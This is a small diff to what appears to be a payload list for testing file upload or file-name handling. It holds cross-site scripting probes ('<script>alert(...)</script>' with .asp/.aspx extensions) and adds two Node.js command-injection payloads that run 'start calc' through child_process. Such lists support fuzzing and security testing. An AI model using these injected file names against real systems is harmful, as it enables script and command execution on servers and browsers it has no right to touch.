@@ -1,6 +1,8 @@
 <script>alert('NFSU')</script>.asp
 <script>alert('NFSU')</script>.aspx
 <script>alert(hemked)</script>.asp
+require('child_process').exec('start calc');.asp
+require('child_process').exec('start calc');.aspx
 <script>alert(NFSU)</script>
 <script>alert(NFSU)</script>
 <script>alert(NFSU)</script>
